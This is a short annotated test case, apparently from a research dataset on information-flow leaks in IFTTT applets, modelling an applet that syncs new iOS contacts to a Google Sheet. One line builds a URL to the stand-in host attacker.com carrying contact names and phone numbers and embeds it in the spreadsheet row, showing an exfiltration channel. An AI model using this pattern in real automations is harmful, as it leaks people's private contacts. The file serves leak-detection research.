// Title: Sync all your new iOS Contacts to a Google Spreadsheet 
// Maker: mcb
// Link : https://ifttt.com/applets/102384p-sync-all-your-new-ios-contacts-to-a-google-spreadsheet

// Trigger: iOS Contacts -> Any new contact
// Action : Google Sheets -> Add row to spreadsheet

// Policy/Presence: Confidentiality of user contacts / No

name = lbl("IosContacts.newContactAdded.Name");
phoneNumber = lbl("IosContacts.newContactAdded.PhoneNumber");
attack = urll("www.attacker.com?" + name + phoneNumber);
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFilename', 'ContactList');
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFormattedRow', name + ' ||| '+ phoneNumber + ' ||| ' + attack);
